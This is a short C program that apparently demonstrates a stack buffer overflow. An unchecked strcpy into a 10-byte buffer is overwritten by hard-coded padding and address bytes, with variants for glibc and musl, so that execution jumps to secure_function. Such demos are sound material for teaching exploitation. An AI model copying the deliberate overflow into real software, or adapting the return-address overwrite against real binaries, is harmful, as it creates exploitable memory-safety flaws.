#include <string.h>
#include <stdlib.h>

int secure_function() {
	exit(0);
	return 1;
}

int copy_name(char *who){
	char name[10];
	strcpy(name, who);
	return 1;
}

int main(){
	copy_name("Quentin");
	// dynamic glibc
	// int result = copy_name("AAAAAAAAAAAAAAAAAAAAAAAA\x58\x08\xaa\xaa\xaa\xaa\0");
	// static musl-libc
	int result = copy_name("AAAAAAAAAAAAAAAAAAAAAAAAAA\x08\x6f\x21\0");
	return result;
}
